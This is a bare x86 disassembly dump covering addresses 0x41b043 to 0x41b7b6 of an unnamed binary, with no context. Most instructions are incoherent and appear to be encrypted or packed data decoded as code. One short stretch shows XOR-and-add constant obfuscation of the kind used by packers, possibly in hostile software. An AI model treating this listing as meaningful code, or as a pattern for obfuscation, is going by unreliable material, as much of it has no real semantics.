  41b043:	cmp    BYTE PTR [eax-0x29],bl
  41b046:	push   eax
  41b047:	and    BYTE PTR [ebp-0x3008f7e5],dl
  41b04d:	xchg   esp,eax
  41b04e:	mov    eax,ss:0xe38b0999
  41b054:	scas   eax,DWORD PTR es:[edi]
  41b055:	hlt    
  41b056:	sub    esi,DWORD PTR [edi]
  41b058:	mov    ebx,0x889c2a35
  41b05d:	add    DWORD PTR [ebx-0x573419a8],0x6ff57342
  41b067:	(bad)  [ecx+edi*4]
  41b06a:	cmp    bl,BYTE PTR [ebp-0x51b7bc75]
  41b070:	js     0x41b0e2
  41b072:	adc    al,0x95
  41b074:	add    al,0x92
  41b076:	leave  
  41b077:	jecxz  0x41b0f2
  41b079:	lds    ebx,FWORD PTR [ebp-0x7e]
  41b07c:	scas   al,BYTE PTR es:[edi]
  41b07d:	call   DWORD PTR [ebp+0x4e]
  41b080:	add    DWORD PTR [edx-0x969ac8f],ecx
  41b086:	xchg   ebp,eax
  41b087:	shl    esp,0x68
  41b08a:	xor    esi,DWORD PTR [edi+edx*2-0x291e7a63]
  41b091:	jae    0x41b09d
  41b093:	fidiv  WORD PTR [ebx+0x63]
  41b096:	sbb    eax,0xa21b7a68
  41b09b:	loopne 0x41b03e
  41b09d:	iret   
  41b09e:	dec    edi
  41b09f:	gs cli 
  41b0a1:	sub    al,0xbf
  41b0a3:	mov    dh,BYTE PTR ds:0x22ecdd7f
  41b0a9:	neg    BYTE PTR [esi]
  41b0ab:	scas   al,BYTE PTR es:[edi]
  41b0ac:	leave  
  41b0ad:	daa    
  41b0ae:	add    ah,BYTE PTR [eax+0x32a7fc3e]
  41b0b4:	mov    cl,0x31
  41b0b6:	data16 (bad) 
  41b0b9:	jne    0x41b121
  41b0bb:	aaa    
  41b0bc:	sub    ebp,DWORD PTR [eax+ebx*2+0x73]
  41b0c0:	push   ax
  41b0c2:	cdq    
  41b0c3:	inc    edi
  41b0c4:	addr16 push es
  41b0c6:	push   0xfffffff5
  41b0c8:	jmp    0x41b0c6
  41b0ca:	pop    esp
  41b0cb:	cdq    
  41b0cc:	call   0x3d5d:0x5967f30c
  41b0d3:	jnp    0x41b0ed
  41b0d5:	cli    
  41b0d6:	(bad)  
  41b0d7:	add    bl,BYTE PTR [eax-0x7f]
  41b0da:	dec    ecx
  41b0db:	scas   eax,DWORD PTR es:[edi]
  41b0dc:	and    cl,BYTE PTR [edx-0xc]
  41b0df:	dec    edx
  41b0e0:	pusha  
  41b0e1:	sub    ch,BYTE PTR [edx-0x4a]
  41b0e4:	mov    eax,ds:0x9ba27804
  41b0e9:	jmp    0x2c45:0xff4046b1
  41b0f0:	int    0x56
  41b0f2:	fprem  
  41b0f4:	je     0x41b0d7
  41b0f6:	imul   esi,DWORD PTR [esi],0x3c813c49
  41b0fc:	fisttp QWORD PTR [esi+0x2b]
  41b0ff:	dec    esp
  41b100:	lods   al,BYTE PTR ds:[esi]
  41b101:	mov    bl,0xa4
  41b103:	push   edx
  41b104:	xlat   BYTE PTR ds:[ebx]
  41b105:	ja     0x41b0e0
  41b107:	inc    eax
  41b108:	lods   eax,DWORD PTR ds:[esi]
  41b109:	dec    ebx
  41b10a:	xor    al,0x73
  41b10c:	ret    
  41b10d:	nop
  41b10e:	mov    ecx,0xa12d19c0
  41b113:	repnz push 0x46
  41b116:	mov    esi,0x7b981f30
  41b11b:	nop
  41b11c:	jb     0x41b104
  41b11e:	aam    0xa5
  41b120:	not    BYTE PTR [edi]
  41b122:	sub    al,0x73
  41b124:	xor    BYTE PTR [edi],ch
  41b126:	sub    DWORD PTR [ebx-0x1d93f05a],eax
  41b12c:	push   cs
  41b12d:	mov    dl,0x35
  41b12f:	ror    DWORD PTR [ecx-0xd9e011e],0xd4
  41b136:	sahf   
  41b137:	adc    eax,0x12cff87b
  41b13c:	stos   DWORD PTR es:[edi],eax
  41b13d:	mov    cl,0x26
  41b13f:	inc    esp
  41b140:	(bad)  
  41b141:	addr16 mov ecx,0x42c8fade
  41b147:	clc    
  41b148:	ins    DWORD PTR es:[edi],dx
  41b149:	jmp    0x9311:0x8f1b9db0
  41b150:	pop    ebx
  41b151:	mov    ds:0x3fc8298b,al
  41b156:	setle  BYTE PTR [ecx+0x44110658]
  41b15d:	call   0xcb63e713
  41b162:	mov    dl,0xe5
  41b164:	sub    al,0x14
  41b166:	jle    0x41b159
  41b168:	jl     0x41b14d
  41b16a:	xor    BYTE PTR [edx],0xb1
  41b16d:	dec    edx
  41b16e:	mov    al,0x77
  41b170:	lahf   
  41b171:	push   esp
  41b172:	mov    WORD PTR ds:0x281fd72e,ss
  41b178:	sub    eax,0x675a6c21
  41b17d:	sbb    bx,WORD PTR [ebx-0xb]
  41b181:	outs   dx,BYTE PTR ds:[esi]
  41b182:	aaa    
  41b183:	stc    
  41b184:	rcl    DWORD PTR ds:[ebx-0x35cc8dec],0xb6
  41b18c:	jnp    0x41b11a
  41b18e:	jo     0x41b158
  41b190:	lds    esp,FWORD PTR [esi+0x2702a74b]
  41b196:	xor    BYTE PTR [edx],bl
  41b198:	inc    esi
  41b199:	add    esi,esi
  41b19b:	push   edi
  41b19c:	inc    edi
  41b19d:	lahf   
  41b19e:	adc    edi,DWORD PTR [edi-0x709efdea]
  41b1a4:	push   esp
  41b1a5:	aaa    
  41b1a6:	inc    ebp
  41b1a7:	rol    esi,cl
  41b1a9:	dec    edi
  41b1aa:	call   0x55d1:0x5b7ac16
  41b1b1:	(bad)  
  41b1b2:	out    0x33,eax
  41b1b4:	sub    DWORD PTR [edx],0x31
  41b1b7:	push   ecx
  41b1b8:	jle    0x41b180
  41b1ba:	jg     0x41b1b3
  41b1bc:	jmp    0x5588:0x2426dc42
  41b1c3:	aas    
  41b1c4:	mov    edi,0x67594577
  41b1c9:	adc    esp,DWORD PTR [ecx-0xe]
  41b1cc:	mov    ah,0x44
  41b1ce:	loope  0x41b16e
  41b1d0:	adc    cl,BYTE PTR [ebp+esi*1+0x2a7ddc3e]
  41b1d7:	arpl   WORD PTR [ecx],bp
  41b1d9:	fimul  WORD PTR [edi]
  41b1db:	mov    ebp,0x468ce206
  41b1e0:	dec    esi
  41b1e1:	inc    ebp
  41b1e2:	push   es
  41b1e3:	dec    ecx
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	shr    BYTE PTR ss:[bx+si+0x27ea],0x17
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b1a3
  41b205:	xor    DWORD PTR [ebx+ebx*8],esp
  41b208:	xor    edi,DWORD PTR [edx]
  41b20a:	mov    ds:0x9459958f,eax
  41b20f:	or     ch,bh
  41b211:	ret    
  41b212:	rol    ebx,1
  41b214:	(bad)  
  41b216:	sub    DWORD PTR [eax+eiz*1-0x1ba0bf35],edx
  41b21d:	int3   
  41b21e:	add    al,0xb9
  41b220:	pop    esi
  41b221:	std    
  41b222:	mov    ebx,0x47ab6194
  41b227:	cli    
  41b228:	pop    ecx
  41b229:	sub    ebx,esi
  41b22b:	xchg   ecx,eax
  41b22c:	add    esp,DWORD PTR [ebx+eiz*2-0x34]
  41b230:	xor    al,0xeb
  41b232:	lds    esp,FWORD PTR [ebp+0x63]
  41b235:	stc    
  41b236:	pushf  
  41b237:	or     BYTE PTR [esi-0x44],0xcd
  41b23b:	mov    ss,WORD PTR [ebp-0x61]
  41b23e:	(bad)  
  41b23f:	arpl   WORD PTR [edi+0x73],si
  41b242:	push   eax
  41b243:	sbb    eax,0x74512cfd
  41b248:	sti    
  41b249:	mov    edi,0x939ac449
  41b24e:	cmp    BYTE PTR [ebp+0x6b13f580],bh
  41b254:	inc    ebx
  41b255:	jno    0x41b2b9
  41b257:	push   ecx
  41b258:	frstor [esi]
  41b25a:	jl     0x41b208
  41b25c:	clc    
  41b25d:	xor    eax,0xa174f16b
  41b262:	pop    edx
  41b263:	mov    eax,0xf0e44dd5
  41b268:	inc    edi
  41b269:	jae    0x41b2b3
  41b26b:	or     eax,0x5966349e
  41b270:	shl    BYTE PTR [ebp+0x49012a71],1
  41b276:	popa   
  41b277:	xor    ebp,DWORD PTR [ecx]
  41b279:	add    BYTE PTR [eax-0x44c47d49],bh
  41b27f:	sbb    edx,DWORD PTR [edx+0x30096bd9]
  41b285:	das    
  41b286:	jmp    0x41b2e3
  41b288:	lea    ecx,[esi]
  41b28a:	adc    edi,ebx
  41b28c:	or     DWORD PTR [ebx],0x27
  41b28f:	aam    0x9d
  41b291:	jae    0x41b2d9
  41b293:	cmp    DWORD PTR [esi+0xa],ebx
  41b296:	int3   
  41b297:	imul   ebp,DWORD PTR [edi-0x24]
  41b29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b29c:	push   es
  41b29d:	repz fisub DWORD PTR [ecx+eax*2+0x67]
  41b2a2:	sti    
  41b2a3:	(bad)  
  41b2a4:	fs addr16 push ebx
  41b2a7:	jg     0x41b248
  41b2a9:	jp     0x41b232
  41b2ab:	mov    edi,0xa71d5db3
  41b2b0:	mov    ah,bh
  41b2b2:	scas   eax,DWORD PTR es:[edi]
  41b2b3:	cmc    
  41b2b4:	fistp  QWORD PTR [eax]
  41b2b6:	ins    DWORD PTR es:[edi],dx
  41b2b7:	and    bh,BYTE PTR [edx-0x15]
  41b2ba:	push   ds
  41b2bb:	sar    DWORD PTR [esi],0xe3
  41b2be:	nop
  41b2bf:	pop    ecx
  41b2c0:	xor    eax,0xe3a586b2
  41b2c5:	dec    ebp
  41b2c6:	push   es
  41b2c7:	daa    
  41b2c8:	rcr    DWORD PTR [ebp-0x2e],1
  41b2cb:	bound  esp,QWORD PTR [ebx-0x2080a05]
  41b2d1:	clc    
  41b2d2:	inc    edi
  41b2d3:	mov    esp,0xe837be7c
  41b2d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2d9:	jge    0x41b283
  41b2db:	mov    ebp,0x677b86cc
  41b2e0:	add    DWORD PTR [edx+0x51],edx
  41b2e3:	jno    0x41b2fd
  41b2e5:	sbb    ch,BYTE PTR [edx-0x9a4b5f2]
  41b2eb:	jg     0x41b304
  41b2ed:	call   0x2e821dec
  41b2f2:	mov    eax,0x60a91e51
  41b2f7:	int3   
  41b2f8:	cmc    
  41b2f9:	dec    edi
  41b2fa:	xor    eax,0x97228ccd
  41b2ff:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b301:	bound  esp,QWORD PTR [ebx+ebx*1+0xfc634cf]
  41b308:	sbb    BYTE PTR [ebp-0x2a],ch
  41b30b:	outs   dx,DWORD PTR ds:[esi]
  41b30c:	les    edi,FWORD PTR [edi-0x21]
  41b30f:	pop    ss
  41b310:	es sub dh,dh
  41b313:	popa   
  41b314:	xor    bl,bl
  41b316:	jge    0x41b2da
  41b318:	ret    0x46df
  41b31b:	sub    DWORD PTR [ecx-0x15],esp
  41b31e:	ds lds esi,FWORD PTR ds:[ebp*1+0x428c118]
  41b327:	daa    
  41b328:	sub    eax,edx
  41b32a:	mov    esp,0xa8f61549
  41b32f:	aaa    
  41b330:	xchg   ebx,eax
  41b331:	xchg   esi,eax
  41b332:	je     0x41b2c0
  41b334:	retf   
  41b335:	lods   al,BYTE PTR ds:[esi]
  41b336:	jge    0x41b30f
  41b338:	lahf   
  41b339:	lods   eax,DWORD PTR ds:[esi]
  41b33a:	jl     0x41b3b5
  41b33c:	ja     0x41b2c0
  41b33e:	in     eax,dx
  41b33f:	push   edx
  41b340:	retf   
  41b341:	push   ebx
  41b342:	mov    esp,0x4039a82c
  41b347:	stos   DWORD PTR es:[edi],eax
  41b348:	pop    es
  41b349:	cwde   
  41b34a:	cmc    
  41b34b:	jno    0x41b306
  41b34d:	shr    DWORD PTR [eax],cl
  41b34f:	inc    ebp
  41b350:	loop   0x41b384
  41b352:	rcr    DWORD PTR [ebp+0x5d],0x8c
  41b356:	int3   
  41b357:	sbb    ecx,ecx
  41b359:	test   al,0xc2
  41b35b:	cs dec esi
  41b35d:	out    0x15,al
  41b35f:	pop    eax
  41b360:	mov    al,ds:0x30ec0e0
  41b365:	daa    
  41b366:	jb     0x41b345
  41b368:	fmul   QWORD PTR ds:0x9993b49
  41b36e:	fadd   DWORD PTR [esi]
  41b370:	and    edi,DWORD PTR [ebx]
  41b372:	mov    esp,0x667a7d30
  41b377:	and    ch,BYTE PTR [ebx-0x11]
  41b37a:	inc    eax
  41b37b:	clc    
  41b37c:	or     eax,0x88e8875c
  41b381:	or     edx,edx
  41b383:	adc    eax,0x203793ee
  41b388:	fild   QWORD PTR [esi-0x37]
  41b38b:	adc    dl,BYTE PTR [edi+0x4c500406]
  41b391:	push   0x229aa3ce
  41b396:	dec    esp
  41b397:	jb     0x41b332
  41b399:	xor    eax,0x4e3a8bf0
  41b39e:	push   ecx
  41b39f:	lock imul esi,esi,0x6e2ddeb1
  41b3a6:	xor    BYTE PTR [ecx],0x52
  41b3a9:	fmulp  st(3),st
  41b3ab:	mov    BYTE PTR [ebx],cl
  41b3ad:	rol    BYTE PTR [ebx+0x46103db4],1
  41b3b3:	fisttp QWORD PTR [edi+0x52]
  41b3b6:	int3   
  41b3b7:	sbb    BYTE PTR [esi-0x21fb05b],cl
  41b3bd:	mov    cl,ch
  41b3bf:	je     0x41b365
  41b3c1:	jns    0x41b409
  41b3c3:	inc    ecx
  41b3c4:	nop
  41b3c5:	in     al,0x4a
  41b3c7:	retf   0x382
  41b3ca:	loop   0x41b38e
  41b3cc:	or     esp,DWORD PTR ds:[ebp+0x7ebe336d]
  41b3d3:	fs jns 0x41b3ea
  41b3d6:	inc    edx
  41b3d7:	pop    ebx
  41b3d8:	sub    BYTE PTR [ebp-0x63],ch
  41b3db:	mov    bh,0x60
  41b3dd:	cdq    
  41b3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3df:	push   ss
  41b3e0:	(bad)  
  41b3e1:	popa   
  41b3e2:	push   0x38
  41b3e4:	pop    ebp
  41b3e5:	mov    edx,es
  41b3e7:	dec    ebx
  41b3e8:	jp     0x41b3cf
  41b3ea:	lock add BYTE PTR [ebp-0x26],dl
  41b3ee:	pusha  
  41b3ef:	int    0x58
  41b3f1:	iret   
  41b3f2:	ret    
  41b3f3:	xor    DWORD PTR [edi+ebp*1+0x31bb36ea],edx
  41b3fa:	jge    0x41b454
  41b3fc:	dec    ebx
  41b3fd:	xchg   BYTE PTR [edx+ebp*8],al
  41b400:	(bad)  
  41b401:	xor    DWORD PTR [ecx],esi
  41b403:	out    0x3f,eax
  41b405:	in     al,dx
  41b406:	fidivr WORD PTR [ebx+0x6e]
  41b409:	repz scas al,BYTE PTR es:[edi]
  41b40b:	lods   eax,DWORD PTR ds:[esi]
  41b40c:	inc    edi
  41b40d:	jns    0x41b457
  41b40f:	cli    
  41b410:	sub    bl,BYTE PTR [esi+0x71e8b731]
  41b416:	mov    ecx,0xb290d81c
  41b41b:	in     eax,0xf
  41b41d:	scas   eax,DWORD PTR es:[edi]
  41b41e:	shr    DWORD PTR [ebx],0xe0
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	adc    edx,ecx
  41b4bb:	scas   al,BYTE PTR es:[edi]
  41b4bc:	xchg   esi,eax
  41b4bd:	shl    dl,0x7f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b45a
  41b4c6:	cmp    al,0xe
  41b4c8:	jne    0x41b523
  41b4ca:	rcl    DWORD PTR [ebx+0x43],1
  41b4cd:	inc    esp
  41b4ce:	outs   dx,BYTE PTR ds:[esi]
  41b4cf:	adc    eax,0x3c2750bc
  41b4d4:	mov    ecx,0x715d7f5e
  41b4d9:	xor    ah,BYTE PTR [ebx-0x69]
  41b4dc:	xchg   ebx,eax
  41b4dd:	xchg   DWORD PTR [ebx-0x62],eax
  41b4e0:	mov    bh,0xf4
  41b4e2:	xor    BYTE PTR [edi-0x2860d2df],0x9b
  41b4e9:	mov    ecx,0xd9c4ff24
  41b4ee:	pop    edx
  41b4ef:	or     esp,ecx
  41b4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4f2:	fisubr DWORD PTR [ebx+0x4b]
  41b4f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4f6:	sub    ebx,DWORD PTR [ecx+ecx*1]
  41b4f9:	xchg   BYTE PTR [ecx+0x6100739a],bh
  41b4ff:	sar    dh,0xdd
  41b502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b503:	adc    bl,BYTE PTR [ecx-0x51bb690a]
  41b509:	bound  eax,QWORD PTR [eax+eiz*2]
  41b50c:	ja     0x41b496
  41b50e:	pop    edx
  41b50f:	sahf   
  41b510:	xchg   DWORD PTR [edi+0x60],esi
  41b513:	pop    esp
  41b514:	sub    cl,BYTE PTR [edx]
  41b516:	pop    es
  41b517:	xor    ch,BYTE PTR [eax+ecx*8-0x79c30925]
  41b51e:	loop   0x41b597
  41b520:	xor    DWORD PTR [ecx+0x14971203],edx
  41b526:	mov    dh,0x68
  41b528:	mov    esi,0x3c81e867
  41b52d:	dec    ecx
  41b52e:	out    0x3f,al
  41b530:	xchg   DWORD PTR [edi],ecx
  41b532:	sub    ebp,DWORD PTR [eax+0x78]
  41b535:	adc    al,0x33
  41b537:	arpl   WORD PTR ds:0xc8ac9e66,dx
  41b53d:	mov    cl,0x3e
  41b53f:	lea    ebp,ds:0xd2b3
  41b544:	mov    dl,0xb9
  41b546:	je     0x41b537
  41b548:	sbb    BYTE PTR [eax+edi*8+0x7a4df023],0xa9
  41b550:	sub    BYTE PTR ds:0x4ad8f31,dl
  41b556:	(bad)  
  41b557:	xor    eax,0xcad920f9
  41b55c:	aad    0xc9
  41b55e:	stos   DWORD PTR es:[edi],eax
  41b55f:	inc    eax
  41b560:	fwait
  41b561:	inc    esp
  41b562:	js     0x41b5b7
  41b564:	psubq  mm7,QWORD PTR [ebx]
  41b567:	(bad)  
  41b568:	enter  0x8dd9,0x56
  41b56c:	pop    ebx
  41b56d:	pop    ds
  41b56e:	xchg   edx,eax
  41b56f:	inc    ebx
  41b570:	fcmove st,st(3)
  41b572:	and    esi,edi
  41b574:	push   esi
  41b575:	out    0x92,al
  41b577:	dec    eax
  41b578:	pop    es
  41b579:	xchg   ebp,eax
  41b57a:	pop    ebx
  41b57b:	mov    BYTE PTR [ebp-0x9e38294],0x4a
  41b582:	(bad)  
  41b583:	push   0x5544c889
  41b588:	test   eax,0xc3cc0793
  41b58d:	scas   eax,DWORD PTR es:[edi]
  41b58e:	adc    DWORD PTR [eax],edx
  41b590:	cmp    edi,DWORD PTR [eax+0x72]
  41b593:	mov    dl,0xc
  41b595:	pop    ds
  41b596:	ds cld 
  41b598:	pushf  
  41b599:	(bad)  
  41b59a:	adc    esi,ebx
  41b59c:	gs in  eax,0x49
  41b59f:	inc    edx
  41b5a0:	fild   WORD PTR [edi+0x79]
  41b5a3:	sbb    DWORD PTR [ebx],ebp
  41b5a5:	ins    DWORD PTR es:[edi],dx
  41b5a6:	hlt    
  41b5a7:	jg     0x41b549
  41b5a9:	stos   DWORD PTR es:[edi],eax
  41b5aa:	call   0x7801:0x2c7362a1
  41b5b1:	dec    edi
  41b5b2:	pop    es
  41b5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5b4:	or     eax,DWORD PTR ds:0xd6f1addc
  41b5ba:	cmp    BYTE PTR [ecx],bh
  41b5bc:	ror    ebp,1
  41b5be:	aaa    
  41b5bf:	jo     0x41b56c
  41b5c1:	pop    ds
  41b5c2:	inc    BYTE PTR [eax+0x49]
  41b5c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5c6:	jle    0x41b5d1
  41b5c8:	push   edx
  41b5c9:	pop    ebx
  41b5ca:	jmp    0xa01f:0x588521d8
  41b5d1:	out    dx,eax
  41b5d2:	pop    esi
  41b5d3:	xchg   ebp,eax
  41b5d4:	xor    DWORD PTR [esi],esp
  41b5d6:	adc    edi,DWORD PTR [eax-0x13]
  41b5d9:	push   ebx
  41b5da:	popa   
  41b5db:	jp     0x41b60b
  41b5dd:	jns    0x41b5d0
  41b5df:	test   DWORD PTR [edi+ebx*4-0x5b4d56ea],edi
  41b5e6:	inc    esi
  41b5e7:	in     al,dx
  41b5e8:	jnp    0x41b5d6
  41b5ea:	jns    0x41b59c
  41b5ec:	mov    ah,0x6e
  41b5ee:	fsub   QWORD PTR [esi+0x6e5570af]
  41b5f4:	jle    0x41b663
  41b5f6:	pop    ss
  41b5f7:	jae    0x41b594
  41b5f9:	cli    
  41b5fa:	dec    eax
  41b5fb:	xchg   DWORD PTR ds:[edx],ebp
  41b5fe:	pop    ss
  41b5ff:	push   esi
  41b600:	or     esi,edx
  41b602:	xor    BYTE PTR [eax-0x47860ef8],dl
  41b608:	mov    dl,0x73
  41b60a:	out    dx,eax
  41b60b:	mov    BYTE PTR [ebx],0xec
  41b60e:	jae    0x41b5ac
  41b610:	jne    0x41b661
  41b612:	push   ebp
  41b613:	xlat   BYTE PTR ds:[ebx]
  41b614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b615:	jg     0x41b624
  41b617:	call   0xe1029d83
  41b61c:	mov    eax,0xc943c6e
  41b621:	lock mov BYTE PTR [ebx-0x5e],bh
  41b625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b627:	and    DWORD PTR [edi-0x769cfb54],0xffffff84
  41b62e:	jecxz  0x41b670
  41b630:	mov    ecx,0xa51cb94e
  41b635:	out    dx,al
  41b636:	push   esp
  41b638:	sar    BYTE PTR [eax+ebx*8],1
  41b63b:	xchg   dl,al
  41b63d:	jbe    0x41b6be
  41b63f:	jne    0x41b670
  41b641:	sbb    cl,BYTE PTR [eiz*4+0x6883840a]
  41b648:	rcl    DWORD PTR [edx-0xe],1
  41b64b:	or     cl,BYTE PTR [edi]
  41b64d:	or     ebx,ebp
  41b64f:	(bad)  
  41b650:	or     DWORD PTR [ecx+ebx*1-0x19],edi
  41b654:	ret    0x6481
  41b657:	sar    ch,0xa3
  41b65a:	stos   BYTE PTR es:[edi],al
  41b65b:	aaa    
  41b65c:	aas    
  41b65d:	bound  ecx,QWORD PTR [esi-0x4]
  41b660:	sub    al,0x8c
  41b662:	and    DWORD PTR [esi+0x15be1336],edi
  41b668:	sbb    BYTE PTR [ebx+0x58c75411],bl
  41b66e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b66f:	mov    esp,0xede9da27
  41b674:	and    dh,dl
  41b676:	adc    cl,dh
  41b678:	mov    bl,0xca
  41b67a:	ins    BYTE PTR es:[edi],dx
  41b67b:	gs (bad) 
  41b67d:	mov    al,ds:0x623e83b1
  41b682:	out    0xd4,al
  41b684:	ficom  DWORD PTR [edi+0x55a7ddb2]
  41b68a:	out    dx,al
  41b68b:	jecxz  0x41b6a3
  41b68d:	test   BYTE PTR [edx-0x31],ch
  41b690:	push   esp
  41b691:	jae    0x41b6d6
  41b693:	inc    esp
  41b694:	rol    BYTE PTR [ecx-0x70361661],cl
  41b69a:	leave  
  41b69b:	and    al,0x1b
  41b69d:	nop
  41b69e:	inc    ecx
  41b69f:	push   edi
  41b6a0:	sar    DWORD PTR [ecx],0x8b
  41b6a3:	push   ebp
  41b6a4:	or     bl,BYTE PTR [esi+0x4e]
  41b6a7:	(bad)  
  41b6a8:	mov    dl,0x15
  41b6aa:	xor    al,BYTE PTR [edx-0x1615d0c4]
  41b6b0:	pushf  
  41b6b1:	in     al,0xdf
  41b6b3:	das    
  41b6b4:	(bad)
  41b6b7:	pop    esi
  41b6b8:	retf   0x7930
  41b6bb:	cmc    
  41b6bc:	mov    esi,0xdea25241
  41b6c1:	mov    bh,0x25
  41b6c3:	add    BYTE PTR [esi+0x76],ah
  41b6c6:	lods   al,BYTE PTR ds:[esi]
  41b6c7:	das    
  41b6c8:	dec    ebp
  41b6c9:	int    0x1a
  41b6cb:	xor    BYTE PTR [ebx-0x9],cl
  41b6ce:	xor    BYTE PTR [eax-0x1e3f1dc5],dl
  41b6d4:	call   0x2942:0xc5854125
  41b6db:	and    BYTE PTR ds:0xc603c133,ch
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0x47db970a]
  41b6f4:	ror    BYTE PTR ds:0x787fe0d8,1
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b6aa
  41b6ff:	std    
  41b700:	push   edi
  41b701:	pop    eax
  41b702:	lahf   
  41b703:	aad    0xd3
  41b705:	fld    QWORD PTR [edi]
  41b707:	pop    ebx
  41b708:	sbb    al,0xd4
  41b70a:	iret   
  41b70b:	sbb    al,0xa
  41b70d:	call   0xae552a42
  41b712:	in     eax,0x26
  41b714:	lods   al,BYTE PTR cs:[esi]
  41b716:	cli    
  41b717:	dec    edx
  41b718:	mov    bl,0xbe
  41b71a:	mov    ebp,0xa06a70db
  41b71f:	clc    
  41b720:	pop    esp
  41b722:	pop    ecx
  41b723:	popa   
  41b724:	call   0xaa79:0x767f7fcb
  41b72b:	in     al,0x14
  41b72d:	jl     0x41b75d
  41b72f:	jne    0x41b792
  41b731:	ret    
  41b732:	out    0xe7,al
  41b734:	pop    esi
  41b735:	push   edx
  41b736:	mov    ebx,0x9a52b7f
  41b73b:	std    
  41b73c:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b73e:	pop    esp
  41b73f:	and    eax,0x5026a1bb
  41b744:	or     eax,0x855bad48
  41b749:	pusha  
  41b74a:	mov    ebx,0x5e2f3b0
  41b74f:	pop    esi
  41b750:	and    BYTE PTR [eax+ebp*2+0x69df6d04],ch
  41b757:	test   DWORD PTR [ebx+0x6c02d770],0xcd1e928a
  41b761:	adc    DWORD PTR [edx+eax*4+0x78],edx
  41b765:	xchg   edi,eax
  41b766:	daa    
  41b767:	lahf   
  41b768:	or     ebx,DWORD PTR [edi-0x1d]
  41b76b:	out    dx,al
  41b76c:	jmp    0x41b6ff
  41b76e:	pop    edx
  41b76f:	es mov edx,0xf53fba28
  41b775:	dec    sp
  41b777:	int3   
  41b778:	mov    fs,esp
  41b77a:	retf   
  41b77b:	call   0xa5e5738a
  41b780:	lods   eax,DWORD PTR ds:[esi]
  41b781:	xchg   esp,eax
  41b782:	rcr    BYTE PTR [ebx+0x67],1
  41b785:	and    DWORD PTR [esp+edx*2-0xbdc2afb],esi
  41b78c:	adc    al,0x5b
  41b78e:	test   BYTE PTR [esi-0x20788f44],ch
  41b794:	jg     0x41b781
  41b796:	or     al,0x94
  41b798:	or     esp,0x4e
  41b79b:	ss retf 
  41b79d:	aad    0x60
  41b79f:	fchs   
  41b7a1:	xchg   esi,eax
  41b7a2:	loopne 0x41b796
  41b7a4:	push   es
  41b7a5:	mov    al,ds:0x289ae89f
  41b7aa:	clc    
  41b7ab:	mov    eax,ds:0xad3725a8
  41b7b0:	sti    
  41b7b1:	adc    DWORD PTR [ebx],eax
  41b7b3:	stos   DWORD PTR es:[edi],eax
  41b7b4:	push   ds
  41b7b5:	sti    
  41b7b6:	inc    esp
